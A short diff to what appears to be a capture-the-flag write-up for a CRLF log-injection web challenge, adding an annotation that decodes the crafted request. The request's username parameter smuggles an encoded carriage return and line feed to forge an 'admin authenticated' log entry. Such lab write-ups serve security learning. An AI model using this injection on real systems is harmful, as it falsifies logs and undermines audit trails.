@@ -34,6 +34,10 @@ guest failed to authenticate.
 
 ```
 GET web-serveur/ch14/username=admin%20authenticated.%0D%0Aguest
+                                ^
+                                |
+                                |
+                    username = "admin authenticated.\r\nguest"
 ```
 
     7. When you make the request in step 6, you will get the flag :)
